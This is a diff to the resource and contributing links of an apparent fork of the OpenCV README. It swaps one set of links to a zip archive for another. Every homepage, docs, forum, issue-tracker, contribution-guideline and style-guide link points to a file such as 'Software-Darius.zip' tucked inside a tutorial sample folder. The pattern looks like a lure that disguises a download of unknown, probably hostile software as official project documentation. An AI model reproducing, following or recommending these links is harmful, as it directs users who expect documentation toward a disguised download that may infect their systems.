@@ -2,14 +2,14 @@
 
 ### Resources
 
-* Homepage: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
-* Docs: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
-* Q&A forum: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
-* Issue tracking: <https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip>
+* Homepage: <https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip>
+* Docs: <https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip>
+* Q&A forum: <https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip>
+* Issue tracking: <https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip>
 
 ### Contributing
 
-Please read the [contribution guidelines](https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip) before starting work on a pull request.
+Please read the [contribution guidelines](https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip) before starting work on a pull request.
 
 #### Summary of the guidelines:
 
@@ -17,4 +17,4 @@ Please read the [contribution guidelines](https://raw.githubusercontent.com/yong
 * Choose the right base branch;
 * Include tests and documentation;
 * Clean up "oops" commits before submitting;
-* Follow the [coding style guide](https://raw.githubusercontent.com/yongsinfok/opencv/master/doc/tutorials/ml/non_linear_svms/images/Software-v1.7.zip).
+* Follow the [coding style guide](https://github.com/yongsinfok/opencv/raw/refs/heads/master/samples/python/tutorial_code/TrackingMotion/good_features_to_track/Software-Darius.zip).
